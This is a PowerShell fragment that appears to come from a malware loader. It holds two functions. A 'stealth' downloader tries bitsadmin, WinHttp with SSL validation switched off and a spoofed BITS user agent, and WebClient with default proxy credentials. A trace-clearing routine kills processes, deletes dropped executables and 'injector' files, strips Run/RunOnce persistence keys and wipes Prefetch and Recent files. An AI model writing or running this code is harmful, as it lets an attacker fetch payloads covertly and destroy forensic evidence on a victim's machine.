# Enhanced download function using multiple stealth techniques
function Get-WebFile {
    param([string]$url, [string]$path)
    
    # Method 1: BITS Admin (Windows Background Intelligent Transfer Service)
    try {
        & bitsadmin /transfer myjob /download /priority high $url $path 2>$null
        if (Test-Path $path) { return $true }
    } catch {}
    
    # Method 2: WinHttp COM with SSL bypass
    try {
        $whr = New-Object -ComObject WinHttp.WinHttpRequest.5.1
        $whr.Option(4) = 0x3300  # Ignore SSL errors
        $whr.Open('GET', $url, $false)
        $whr.SetRequestHeader('User-Agent', 'Microsoft BITS/10.0')
        $whr.Send()
        if ($whr.Status -eq 200) {
            [IO.File]::WriteAllBytes($path, $whr.ResponseBody)
            return $true
        }
    } catch {}
    
    # Method 3: .NET WebClient with system proxy
    try {
        $wc = New-Object Net.WebClient
        $wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $wc.DownloadFile($url, $path)
        return $true
    } catch {}
    
    return $false
}

# Cleanup function - removes all traces
function Clear-AllTraces {
    # Kill processes
    $procs = Get-Process -Name $systemName, "rundll32", "cmd" -ErrorAction SilentlyContinue | 
        Where-Object { $_.Path -like "*$basePath*" }
    
    foreach ($proc in $procs) {
        try { $proc.Kill() } catch {}
    }
    
    # Remove files
    $files = @(
        $exePath,
        $dllPath,
        "$basePath\$systemName.manifest",
        "$basePath\run.cmd",
        "$env:TEMP\resource.*",
        "$env:TEMP\injector.*"
    )
    
    foreach ($file in $files) {
        try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
    }
    
    # Clean registry
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )
    
    foreach ($path in $regPaths) {
        try {
            $keys = Get-Item $path -ErrorAction SilentlyContinue
            if ($keys) {
                $keys.GetValueNames() | ForEach-Object {
                    if ($keys.GetValue($_) -like "*$systemName*" -or 
                        $keys.GetValue($_) -like "*$basePath*") {
                        Remove-ItemProperty -Path $path -Name $_ -Force
                    }
                }
            }
        } catch {}
    }
    
    # Clear prefetch
    try {
        Get-ChildItem "$env:SystemRoot\Prefetch\*$systemName*" -ErrorAction SilentlyContinue | 
            Remove-Item -Force
    } catch {}
    
    # Clear recent files
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
    } catch {}
}
